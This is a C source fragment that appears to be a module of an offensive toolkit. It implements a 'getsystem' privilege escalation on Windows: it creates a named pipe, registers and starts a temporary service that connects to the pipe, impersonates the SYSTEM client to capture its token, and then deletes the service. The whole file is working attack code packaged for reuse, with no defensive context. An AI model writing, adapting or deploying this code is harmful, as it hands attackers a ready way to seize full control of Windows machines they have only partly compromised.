// chunk: privesc/getsystem_pipe
// depends: (none)
// provides: getsystem_pipe
// headers: windows.h
// note: Get SYSTEM via named pipe impersonation

#ifndef CHUNK_PRIVESC_GETSYSTEM_PIPE
#define CHUNK_PRIVESC_GETSYSTEM_PIPE

static HANDLE g_system_token = NULL;

static DWORD WINAPI _pipe_server_thread(LPVOID param) {
    const char *pipe_name = (const char *)param;
    char full_pipe[256];
    snprintf(full_pipe, sizeof(full_pipe), "\\\\.\\pipe\\%s", pipe_name);

    HANDLE hPipe = CreateNamedPipeA(
        full_pipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        1024, 1024, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        if (ImpersonateNamedPipeClient(hPipe)) {
            HANDLE hToken;
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
                HANDLE hDup;
                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                     SecurityImpersonation, TokenPrimary, &hDup)) {
                    g_system_token = hDup;
                }
                CloseHandle(hToken);
            }
            RevertToSelf();
        }
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return 1;
}

static int getsystem_pipe(void) {
    char pipe_name[64];
    snprintf(pipe_name, sizeof(pipe_name), "pipe_%08x", GetTickCount());

    HANDLE hThread = CreateThread(NULL, 0, _pipe_server_thread, pipe_name, 0, NULL);
    if (!hThread) return 0;

    Sleep(100);

    char full_pipe[256];
    snprintf(full_pipe, sizeof(full_pipe), "\\\\.\\pipe\\%s", pipe_name);

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        WaitForSingleObject(hThread, 1000);
        CloseHandle(hThread);
        return 0;
    }

    char svc_name[64];
    snprintf(svc_name, sizeof(svc_name), "svc%08x", GetTickCount());

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c echo. > %s", full_pipe);

    SC_HANDLE hSvc = CreateServiceA(
        hSCM, svc_name, svc_name,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        cmd, NULL, NULL, NULL, NULL, NULL
    );

    if (hSvc) {
        StartServiceA(hSvc, 0, NULL);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }

    CloseServiceHandle(hSCM);

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);

    return g_system_token ? 1 : 0;
}

static HANDLE get_system_token(void) {
    return g_system_token;
}

#endif
